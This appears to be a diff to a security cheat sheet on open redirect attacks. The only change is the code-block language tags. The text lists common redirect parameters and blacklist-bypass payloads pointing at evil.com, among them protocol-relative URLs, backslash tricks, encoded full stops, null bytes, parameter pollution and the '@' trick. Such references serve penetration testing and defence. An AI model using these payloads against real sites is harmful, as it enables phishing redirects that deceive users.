@@ -4,7 +4,7 @@ description: Attacker redirects a user to an external URL
 ---
 ## Exploit
 ### Common injection parameters
-```url
+```css
 /
 ?next
 ?url
@@ -81,39 +81,39 @@ ReturnUrl
 ### Bypass blacklist
 `http` blacklist bypass:
 
-```html
+```css
 //evil.com
 ```
 
 `//` blacklist bypass:
-```url
+```css
 https:evil.com
 ```
 Using `//` to bypass `//` blacklisted keyword (Browsers see `//` as `//`)
-```url
+```css
 \/\/evil.com/
 /\/evil.com/
 ```
 Using `/` to bypass:
-```url
+```css
 /\evil.com
 ```
 
 URL encode Unicode full stop 。
-```url
+```css
 //evil%E3%80%82com
 ```
 
 Null byte
-```html
+```css
 //evil%00.com
 ```
 Parameter pollution
-```url
+```css
 ?next=whitelisted.com&next=evil.com
 ```
 Using "@" character, browser will redirect to anything after the "@"
-```url
+```css
 http://www.theirsite.com@evil.com/
 ```
 ### DOM based
